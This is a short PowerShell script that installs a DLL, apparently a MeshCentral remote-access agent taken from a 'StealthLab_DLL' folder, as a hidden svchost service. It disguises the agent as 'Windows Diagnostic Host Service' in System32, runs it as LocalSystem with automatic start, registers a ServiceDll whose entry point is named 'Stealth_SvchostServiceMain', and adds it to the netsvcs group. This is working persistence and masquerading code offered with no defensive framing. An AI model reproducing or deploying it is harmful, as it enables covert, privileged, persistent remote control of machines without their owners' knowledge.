# Quick svchost installer
$ServiceName = "WinDiagnosticHost"
$DllPath = "C:\WINDOWS\System32\DiagnosticHost\diagsvc.dll"

Write-Host "Installing to svchost mode..." -ForegroundColor Cyan

# Create directory
New-Item -Path "C:\WINDOWS\System32\DiagnosticHost" -ItemType Directory -Force | Out-Null

# Copy DLL
Copy-Item ".\meshservice\x64\StealthLab_DLL\MeshService-2022.dll" -Destination $DllPath -Force
Write-Host "DLL copied" -ForegroundColor Green

# Create service
sc.exe create $ServiceName binPath= "C:\WINDOWS\System32\svchost.exe -k netsvcs -p" type= share start= auto DisplayName= "Windows Diagnostic Host Service" obj= LocalSystem

# Set Parameters
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName\Parameters" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName\Parameters" -Name "ServiceDll" -Value $DllPath -Type ExpandString
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName\Parameters" -Name "ServiceMain" -Value "Stealth_SvchostServiceMain" -Type String

# Add to netsvcs
$svchostPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$services = (Get-ItemProperty -Path $svchostPath -Name "netsvcs").netsvcs
if ($services -notcontains $ServiceName) {
    Set-ItemProperty -Path $svchostPath -Name "netsvcs" -Value ($services + $ServiceName) -Type MultiString
}

# Start
Start-Service -Name $ServiceName
Start-Sleep -Seconds 5
Get-Service -Name $ServiceName

# Verify
$svc = Get-CimInstance Win32_Service -Filter "Name='$ServiceName'"
Write-Host ""
Write-Host "Process ID: $($svc.ProcessId)" -ForegroundColor Cyan
$proc = Get-Process -Id $svc.ProcessId
Write-Host "Process: $($proc.Name)" -ForegroundColor Cyan
